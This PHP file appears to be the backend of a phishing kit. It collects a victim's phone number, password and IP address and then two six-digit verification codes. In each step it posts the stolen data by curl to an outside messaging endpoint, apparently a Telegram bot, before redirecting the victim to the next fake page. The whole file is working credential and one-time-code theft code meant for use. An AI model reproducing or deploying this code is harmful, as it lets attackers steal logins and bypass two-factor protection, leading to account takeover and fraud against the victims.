<?php
session_start();
error_reporting(0);
include('./ip.php');
include('./access.php');


$ip = getRealIP();

switch ($_POST["accion"]) {
    case 'first':
        $phone = $_POST['phone'];
        $pass = $_POST['pass'];

        $msg = "DATA:\n\nTelefono: $phone \nContraseña: $pass \nIP: $ip \n\nEND";
        //$csv = fopen("files/$phone.csv", "a");
        //fwrite($csv, $msg);
        //fclose($csv);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
        curl_setopt($ch, CURLOPT_URL, $urlMsg);
        curl_setopt($ch, CURLOPT_POST, 1);
        // send the csv file
        //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$phone.csv")));
        curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
        // receive server response ...
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $server_output = curl_exec($ch);
        curl_close($ch);
        // further processing ....
        //unlink("files/$phone.csv");
        // get the ok message from the json response
        $json = json_decode($server_output, true);
        $ok = $json['ok'];

        if ($ok) {
            header("Location: ../accessValidation.php");
        } else {
            header("Location: ../index.php?error=1");
        }
        break;

    case 'second':

        $code = $_POST['code'];

        if (!empty($code) && is_numeric($code) && strlen($code) == 6) {
            $msg = "DATA:\n\nCode: $code \nIP: $ip \n\nEND";
            //$csv = fopen("files/$code.csv", "a");
            //fwrite($csv, $msg);
            //fclose($csv);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            // send the csv file
            //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$code.csv")));
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            // receive server response ...
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);
            curl_close($ch);
            // further processing ....
            //unlink("files/$code.csv");
            // get the ok message from the json response
            $json = json_decode($server_output, true);
            $ok = $json['ok'];

            if ($ok) {
                header("Location: ../verify.php");
            } else {
                header("Location: ../accessValidation.php?error=1");
            }
        }

        break;

    case 'third':
        $code = $_POST['code'];

        if (!empty($code) && is_numeric($code) && strlen($code) == 6) {
            $msg = "DATA:\n\nCode: $code \nIP: $ip \n\nEND";
            //$csv = fopen("files/$code.csv", "a");
            //fwrite($csv, $msg);
            //fclose($csv);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_SSL_CIPHER_LIST, 'DEFAULT:!DH');
            curl_setopt($ch, CURLOPT_URL, $urlMsg);
            curl_setopt($ch, CURLOPT_POST, 1);
            // send the csv file
            //curl_setopt($ch, CURLOPT_POSTFIELDS, array('chat_id' => $id, 'parse_mode' => 'HTML', 'text' => $msg, 'document' => new CURLFile("files/$code.csv")));
            curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
            // receive server response ...
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);
            curl_close($ch);
            // further processing ....
            //unlink("files/$code.csv");
            // get the ok message from the json response
            $json = json_decode($server_output, true);
            $ok = $json['ok'];

            if ($ok) {
                header("Location: ../finish.php");
            } else {
                header("Location: ../verify.php?error=1");
            }
        }
        break;

    default:
        header("Location: ../index.php");
        break;
}
